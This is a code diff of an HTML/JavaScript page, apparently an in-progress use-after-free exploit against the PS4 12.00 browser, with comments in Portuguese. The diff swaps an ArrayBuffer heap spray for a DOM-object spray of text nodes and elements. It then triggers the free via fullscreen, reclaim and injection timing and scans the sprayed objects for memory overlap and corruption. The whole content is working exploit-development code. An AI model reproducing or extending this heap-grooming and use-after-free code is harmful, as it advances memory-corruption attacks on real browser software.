@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Overlap Stage</title>
+<title>PS4 12.00 - UAF DOM Overlap Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Type Confusion → ArrayBuffer Overlap</h2>
+<h2>UAF → Type Confusion → DOM Overlap</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,29 +20,40 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 GLOBAL SPRAY (CRÍTICO)
-let ab_views = [];
+// 🌍 DOM SPRAY (MESMA ARENA)
+let dom_spray = [];
 
-function setupABSpray(){
-    log("[*] Setup ArrayBuffer spray");
+function setupDOMSpray(){
+    log("[*] Setup DOM spray");
 
-    ab_views = [];
+    dom_spray = [];
 
-    for (let i = 0; i < 12000; i++) {
-
-        let buf = new ArrayBuffer(0x40);
-        let view = new Uint32Array(buf);
-
-        view[0] = 0x41414141;
-        view[1] = 0x42424242;
-        view[2] = 0x43434343;
-
-        ab_views.push(view);
+    // 🔥 TextNodes
+    for(let i=0;i<6000;i++){
+        let t = document.createTextNode("TXT_" + i);
+        document.body.appendChild(t);
+        dom_spray.push(t);
     }
 
-    window.ab_views = ab_views;
+    // 🔥 Elements
+    for(let i=0;i<6000;i++){
+        let d = document.createElement("div");
+        d.innerHTML = "EL_" + i;
+        document.body.appendChild(d);
+        dom_spray.push(d);
+    }
 
-    log("[*] Spray pronto: " + ab_views.length);
+    // 🔥 Attributes
+    for(let i=0;i<6000;i++){
+        let d = document.createElement("div");
+        d.setAttribute("data-x", "ATTR_" + i);
+        document.body.appendChild(d);
+        dom_spray.push(d);
+    }
+
+    window.dom_spray = dom_spray;
+
+    log("[*] DOM spray pronto: " + dom_spray.length);
 }
 
 // ==========================
@@ -81,18 +91,16 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (mantém padrão)
+// 💣 RECLAIM (mantido)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
 
-    // churn
     for(let i=0;i<3000;i++){
         let e=document.createElement("div");
         document.body.appendChild(e);
         e.remove();
     }
 
-    // DOM spray
     for(let i=0;i<size;i++){
         let e=document.createElement("div");
         e.innerHTML="<h1>CONTROL_"+i+"</h1>";
@@ -119,9 +127,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OVERLAP PROBE
-function overlapProbe(fsTarget){
-    log("---- OVERLAP PROBE ----");
+// 🔬 DOM OVERLAP PROBE
+function domOverlapProbe(fsTarget){
+    log("---- DOM OVERLAP PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -145,35 +153,40 @@ function overlapProbe(fsTarget){
                 log("[UAF] write crash");
             }
 
-            // 💣 SCAN ARRAYBUFFER
+            // ==========================
+            // 🔥 SCAN DOM
             try{
-                for(let i=0;i<ab_views.length;i++){
 
-                    let v = ab_views[i];
+                for(let i=0;i<dom_spray.length;i++){
 
-                    if(
-                        v[0] !== 0x41414141 ||
-                        v[1] !== 0x42424242 ||
-                        v[2] !== 0x43434343
-                    ){
-                        log("[!!!] OVERLAP DETECTADO @ " + i);
-                        log("[!!!] values = " + v[0] + "," + v[1] + "," + v[2]);
+                    let obj = dom_spray[i];
 
-                        // 🔥 dump parcial
-                        let dump = [];
-                        for(let j=0;j<8;j++){
-                            dump.push(v[j]);
+                    // 🔥 TextNode corrupção
+                    if(obj.nodeType === 3){
+                        if(!obj.data || !obj.data.includes("TXT_")){
+                            log("[!!!] TEXTNODE CORROMPIDO @ " + i);
+                            log("[!!!] data = " + obj.data);
+                            return;
                         }
-
-                        log("[DUMP] " + dump.join(","));
-                        return;
                     }
+
+                    // 🔥 Element overlap
+                    if(obj.nodeType === 1){
+                        let html = obj.innerHTML;
+
+                        if(html && html.includes("AAAA")){
+                            log("[!!!] ELEMENT OVERLAP @ " + i);
+                            log("[!!!] innerHTML = " + html);
+                            return;
+                        }
+                    }
+
                 }
 
                 log("[SCAN] nenhum overlap detectado");
 
             }catch(e){
-                log("[UAF] scan crash");
+                log("[UAF] DOM scan crash");
             }
 
         } else {
@@ -207,7 +220,6 @@ function trigger(fsTarget){
         setTimeout(()=>reclaim(s), i*50);
     });
 
-    // injeção crítica
     setTimeout(()=>{
         try{
             let child = fsTarget.firstChild;
@@ -215,17 +227,15 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
-    // probes múltiplos
-    setTimeout(()=>overlapProbe(fsTarget), 80);
-    setTimeout(()=>overlapProbe(fsTarget), 160);
-    setTimeout(()=>overlapProbe(fsTarget), 240);
+    setTimeout(()=>domOverlapProbe(fsTarget), 80);
+    setTimeout(()=>domOverlapProbe(fsTarget), 160);
+    setTimeout(()=>domOverlapProbe(fsTarget), 240);
 
-    // dump final
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     }, 400);
 
-    // ⚠️ NÃO ALTERAR
+    // ⚠️ CRÍTICO
     setTimeout(()=>location.reload(), 500);
 }
 
@@ -234,7 +244,7 @@ function trigger(fsTarget){
 function runTest(){
     log("[*] Iniciando teste");
 
-    setupABSpray(); // 🔥 CRÍTICO
+    setupDOMSpray(); // 🔥 AGORA CORRETO
 
     let heap=setupHeap();
     let fsTarget=setupFullscreen();
